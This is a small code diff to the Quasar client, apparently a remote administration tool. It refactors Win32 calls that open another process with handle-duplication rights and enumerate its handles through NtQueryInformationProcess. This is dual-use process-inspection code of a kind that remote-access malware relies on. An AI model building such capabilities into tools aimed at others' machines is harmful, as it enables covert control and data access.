@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Quasar.Client.Utilities;
+using System;
 using System.Runtime.InteropServices;
 
 namespace Quasar.Client.Win32PE.Structs
@@ -71,14 +72,14 @@ namespace Quasar.Client.Win32PE.Structs
             NT_STATUS ret;
 
             var ptr = Marshal.AllocHGlobal(guessSize);
-            var processHandle = NativeMethods.OpenProcess(
+            var processHandle = ClientNatives.OpenProcess(
                 ProcessAccessRights.PROCESS_QUERY_INFORMATION | ProcessAccessRights.PROCESS_DUP_HANDLE, false, pid);
             if (processHandle == IntPtr.Zero)
                 return;
 
             while (true)
             {
-                ret = NativeMethods.NtQueryInformationProcess(processHandle, PROCESS_INFORMATION_CLASS.ProcessHandleInformation, ptr, guessSize, out var requiredSize);
+                ret = ClientNatives.NtQueryInformationProcess(processHandle, PROCESS_INFORMATION_CLASS.ProcessHandleInformation, ptr, guessSize, out var requiredSize);
 
                 if (ret == NT_STATUS.STATUS_INFO_LENGTH_MISMATCH)
                 {
